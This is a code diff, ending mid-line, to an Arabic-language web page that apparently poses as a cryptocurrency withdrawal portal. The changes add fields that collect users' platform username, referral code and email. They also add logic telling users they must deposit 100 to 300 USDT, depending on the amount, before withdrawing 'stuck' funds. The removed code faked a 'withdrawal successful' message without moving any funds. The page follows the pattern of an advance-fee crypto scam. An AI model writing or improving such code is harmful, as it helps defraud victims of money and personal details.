@@ -60,13 +60,6 @@ h3,h4{
   white-space:nowrap;
   font-family:monospace;
 }
-.wallet-address::-webkit-scrollbar{
-  height:6px;
-}
-.wallet-address::-webkit-scrollbar-thumb{
-  background:var(--accent);
-  border-radius:3px;
-}
 input[type="text"], input[type="number"], input[type="file"]{
   width:100%;
   padding:8px 10px;
@@ -148,12 +141,15 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
     <h4>طلب سحب بعد التحقق</h4>
     <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة</div>
 
-    <!-- المبلغ المراد سحبه -->
+    <!-- حقول سحب إضافية -->
     <div class="wallet-row">
+      <input id="withdraw-username" placeholder="اسمك على المنصة"/>
+      <input id="withdraw-refcode" placeholder="كود الدعوة"/>
+      <input id="withdraw-email" placeholder="البريد الإلكتروني"/>
       <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)"/>
     </div>
 
-    <!-- خانة المحفظة مع توضيح -->
+    <!-- خانة المحفظة -->
     <div style="margin-top:8px">
       <label>ضع محفظتك هنا (USDT BEP20)</label>
       <input id="withdraw-target-wallet" placeholder="عنوان محفظتك لاستلام السحب (BEP20)"/>
@@ -196,24 +192,26 @@ function copyDepositAddress(){
 function submitVerificationDeposit(){
   const file = document.getElementById('proof-file').files[0];
   const amount = parseFloat(document.getElementById('deposit-amount').value);
-  if(isNaN(amount) || amount <= 0){ alert('يرجى إدخال مبلغ الإيداع'); return; }
   if(!file){ alert('يرجى إرفاق صورة إثبات الدفع'); return; }
-  document.getElementById('verify-msg').innerText = 'تم إرسال طلب التحقق — قيد المراجعة';
-  alert(`تم إرسال طلب التحقق لمبلغ ${amount} USDT بنجاح، قيد المراجعة.`);
+  if(isNaN(amount) || amount <= 0){ alert('يرجى إدخال مبلغ الإيداع'); return; }
+
+  let required;
+  if(amount <= 500) required = 100;
+  else if(amount >= 2000) required = 300;
+  else required = 200;
+
+  document.getElementById('verify-msg').innerText = `لمبلغ ${amount} USDT، يجب إيداع ${required} USDT`;
+  alert(`لمبلغ ${amount} USDT، يجب إيداع ${required} USDT`);
 }
 
 function requestWithdraw(){
+  const username = document.getElementById('withdraw-username').value.trim();
+  const refcode = document.getElementById('withdraw-refcode').value.trim();
+  const email = document.getElementById('withdraw-email').value.trim();
   const amt = parseFloat(document.getElementById('withdraw-amount').value);
   const wallet = document.getElementById('withdraw-target-wallet').value.trim();
   const lockedFile = document.getElementById('locked-funds-file').files[0];
 
+  if(!username || !refcode || !email){ alert('يرجى ملء جميع بيانات الحساب'); return; }
   if(isNaN(amt) || amt <= 0){ alert('أدخل مبلغ سحب صالح'); return; }
-  if(!wallet){ alert('أدخل عنوان محفظتك لاستلام السحب'); return; }
-  if(!lockedFile){ alert('يرجى رفع صورة للأموال العالقة قبل السحب'); return; }
-
-  document.getElementById('withdraw-msg').innerText = 'تم السحب بنجاح';
-  alert(`تم السحب بنجاح بمبلغ ${amt} USDT. ستصلك رسالة بريد إلكتروني.`);
-}
-</script>
-</body>
-</html>
+  if(!
